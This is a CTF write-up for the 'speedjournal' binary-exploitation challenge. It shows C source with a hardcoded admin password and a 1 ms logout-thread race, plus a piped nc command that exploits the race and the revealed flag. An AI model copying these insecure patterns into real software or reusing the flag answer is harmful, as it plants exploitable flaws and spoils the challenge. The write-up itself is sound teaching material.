---
layout: post
title:  "speedjournal"
date:   2026-01-12 01:04:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /scarletCTF-speedjournal/
---

**Title**: speedjournal

**Category**: Binex

**Author**: reuvi

**Description**: Its 2026, I need to start journal-maxing. Thats why I use speedjournal, which lets me brain-max my thoughts while time-maxing with the speed of C! Its also security-maxed so only I can read my private entries! `nc challs.ctf.rusec.club 22169`

I get the challenge files. `speedjournal.c`:
```c
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <pthread.h>  
#include <unistd.h>  
  
#define MAX_LOGS 8  
#define LOG_SIZE 128  
#define WAIT_TIME 1000  
  
typedef struct {  
    char content[LOG_SIZE];  
    int restricted;  
} Log;  
  
Log logs[MAX_LOGS];  
int log_count = 0;  
  
int is_admin = 0;  
  
void *logout_thread(void *arg) {  
    usleep(WAIT_TIME);  
    is_admin = 0;  
    return NULL;  
}  
  
void login_admin() {  
    char pw[32];  
    printf("Admin password: ");  
    fgets(pw, sizeof(pw), stdin);  
  
    if (strncmp(pw, "supersecret\n", 12) == 0) {  
        is_admin = 1;  
  
        pthread_t t;  
        pthread_create(&t, NULL, logout_thread, NULL);  
        pthread_detach(t);  
  
        puts("[+] Admin logged in (temporarily)");  
    } else {  
        puts("[-] Wrong password");  
    }  
}  
  
void write_log() {  
    if (log_count >= MAX_LOGS) {  
        puts("Log full");  
        return;  
    }  
  
    printf("Restricted? (1/0): ");  
    int r;  
    scanf("%d", &r);  
    getchar();  
  
    printf("Content: ");  
    fgets(logs[log_count].content, LOG_SIZE, stdin);  
    logs[log_count].restricted = r;  
  
    log_count++;  
}  
  
void read_log() {  
    int idx;  
    printf("Index: ");  
    scanf("%d", &idx);  
    getchar();  
  
    if (idx < 0 || idx >= log_count) {  
        puts("Invalid index");  
        return;  
    }  
  
    if (logs[idx].restricted && !is_admin) {  
        puts("Access denied");  
        return;  
    }  
  
    printf("Log: %s\n", logs[idx].content);  
}  
  
void menu() {  
    puts("\n1. Login admin");  
    puts("2. Write log");  
    puts("3. Read log");  
    puts("4. Exit");  
    printf("> ");  
}  
  
int main() {  
    setbuf(stdout, NULL);  
  
    strcpy(logs[0].content, "RUSEC{not_the_real_flag}\n");  
    logs[0].restricted = 1;  
    log_count = 1;  
  
    while (1) {  
        menu();  
        int c;  
        scanf("%d", &c);  
        getchar();  
  
        switch (c) {  
            case 1: login_admin(); break;  
            case 2: write_log(); break;  
            case 3: read_log(); break;  
            case 4: exit(0);  
            default: puts("?");  
        }  
    }  
}
```

`Makefile`:
```shell
CC=gcc  
CFLAGS=-pthread -O0 -g -Wall  
  
all: speedjournal  
  
diary: speedjournal.c  
       $(CC) $(CFLAGS) speedjournal.c -o demo-speedjournal  
  
clean:  
       rm -f speedjournal
```

Clearly the admin password is `supersecret`. After becoming admin a background thread waits 1 millisecond, then logs you out. Beat the race:
```shell
printf "1\nsupersecret\n3\n0\n" | nc challs.ctf.rusec.club 22169  
  
1. Login admin  
2. Write log  
3. Read log  
4. Exit  
> Admin password: [+] Admin logged in (temporarily)  
  
5. Login admin  
6. Write log  
7. Read log  
8. Exit  
> Index: Log: RUSEC{wow_i_did_a_data_race}  
  
  
9. Login admin  
10. Write log  
11. Read log  
12. Exit  
> ^C
```

`RUSEC{wow_i_did_a_data_race}`